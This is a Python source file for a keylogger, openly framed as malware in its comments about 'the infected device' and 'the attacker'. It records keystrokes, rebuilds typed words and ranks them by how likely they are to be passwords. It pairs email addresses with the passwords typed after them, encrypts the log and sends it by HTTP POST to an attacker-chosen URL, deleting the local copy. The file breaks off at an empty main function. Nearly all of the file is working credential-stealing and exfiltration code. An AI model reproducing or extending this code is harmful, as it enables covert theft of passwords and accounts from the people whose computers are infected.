import keyboard
import os
import re
from typing import IO
import requests
import uuid
import time
import encryption_decryption

#Create a filename based off the current timestamp and the infected device's MAC address
#The name is in the format timestamp MAC address
#This allows the attacker to identify each infected and each uploaded file per infected

class Word:
    def __init__(self) -> None:
        self.letters = ""
        self.status = False
        self.priority = 2


def generate_file_name()-> str:
    time_stamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
    return str(time_stamp+" "+str(uuid.getnode()))

#Creates the logged_words_file and returns an IO object for writing to the file
def create_logged_words_file(path:str, file_name:str)->IO:
    file_path = os.path.join(path, file_name)
    return open(file_path, "ab")

#Determines the priority of a word bassed off of how likely it is to be a password
def word_priority_predictor(word: Word)->int:
    #Matches any string that is 8 characters or more, as most passwords usually are
    length_regex = re.compile(r'^.{8,}$')
    #Matches any string that includes a mix of uppercase and lowercase letters, numbers, and special characters, which is usually a password requirement
    special_char_regex = re.compile(r'^(?=.*?[A-Z])(?=.*?[a-z])(?=.*?[0-9])(?=.*?[#?!@$%^&*-])\S+$')

    if length_regex.match(word.letters):
        if special_char_regex.match(word.letters):
            word.priority = 0
        else:
            word.priority = 1

#Keeps track of the word being typed until enter or space or tab is logged
def read_word_being_typed(word: Word, event: keyboard.KeyboardEvent):
    #If enter, space or tab is logged then return true cause we assume the infected has finished typing the word
    if event.name == "enter" or event.name == "space" or event.name == "tab":
        word_priority_predictor(word)
        word.status = True
    elif event.name == "backspace":
        word.letters = word.letters[:-1] if word.letters else "" #To avoid an IndexError for cases where the string is empty
    else:
        #Update the word string if only one character was entered, to avoid saving keyboard events like ctrl, shift etc
        if len(event.name)==1:
            word.letters+=event.name
    


#Check whether the typed word is potentially an email
def email_check(word: str):
    email_regex = re.compile('^[\w+\-.]+@[a-z\d\-]+(\.[a-z\d\-]+)*\.[a-z]+$')
    return email_regex.match(word)

#Encrypt the logged word then write it to the logged_words_file
def update_logged_words_file(word: Word, public_key: encryption_decryption.rsa.RSAPublicKey, file: IO):
    #If the word is an email then we dont add a newspace character cause it's highly likely the password will come after it, and also we want the emails to have the same priority as their corresponding password
    logged_word = "email: "+ word.letters +" password: " if email_check(word.letters) else word+" "+str(word.priority)+"\n"
    #Convert the string into bytes for encryption
    logged_word = logged_word.encode() 
    logged_word = encryption_decryption.encrypt(logged_word, public_key)
    file.write(logged_word)

#Upload the file to whatever site the attacker wants then delete it
def upload(file_path:str, file_name:str, url:str, token:str)->bool:
    with open(file_path, "rb") as f:
        file = {"file": (file_name, f)}
        response = requests.post(url=url+token, files=file)
    os.unlink(file_path)
    return response.json()["status"]


def main():


